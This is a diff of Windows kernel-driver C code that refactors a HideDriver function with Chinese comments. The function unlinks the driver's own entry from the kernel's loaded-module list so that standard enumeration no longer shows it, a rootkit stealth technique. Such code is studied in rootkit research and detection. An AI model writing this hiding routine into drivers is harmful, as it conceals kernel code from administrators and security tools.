@@ -334,20 +334,19 @@ typedef struct _LDR_DATA_TABLE_ENTRY
 
 void HideDriver(IN PDRIVER_OBJECT DriverObject) {
 
-	KIRQL irql = KeRaiseIrqlToDpcLevel(); //
+	KIRQL irql = KeRaiseIrqlToDpcLevel(); 
 
+	PLDR_DATA_TABLE_ENTRY pre_section, next_section, cur_section;
+	cur_section = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+	pre_section = (PLDR_DATA_TABLE_ENTRY)cur_section->InLoadOrderLinks.Blink;
+	next_section = (PLDR_DATA_TABLE_ENTRY)cur_section->InLoadOrderLinks.Flink;
 
-	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, modEntry;
-	modEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
-	prevEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Blink;
-	nextEntry = (PLDR_DATA_TABLE_ENTRY)modEntry->InLoadOrderLinks.Flink;
-
-	//双链表操作
-	prevEntry->InLoadOrderLinks.Flink = modEntry->InLoadOrderLinks.Flink;
-	nextEntry->InLoadOrderLinks.Blink = modEntry->InLoadOrderLinks.Blink;
-	modEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)modEntry;
-	modEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)modEntry;
-
+	//双链表节点脱链
+	pre_section->InLoadOrderLinks.Flink = cur_section->InLoadOrderLinks.Flink;
+	next_section->InLoadOrderLinks.Blink = cur_section->InLoadOrderLinks.Blink;
+	//自循环
+	cur_section->InLoadOrderLinks.Flink = (PLIST_ENTRY)cur_section;
+	cur_section->InLoadOrderLinks.Blink = (PLIST_ENTRY)cur_section;
 
 	KeLowerIrql(irql);
 }
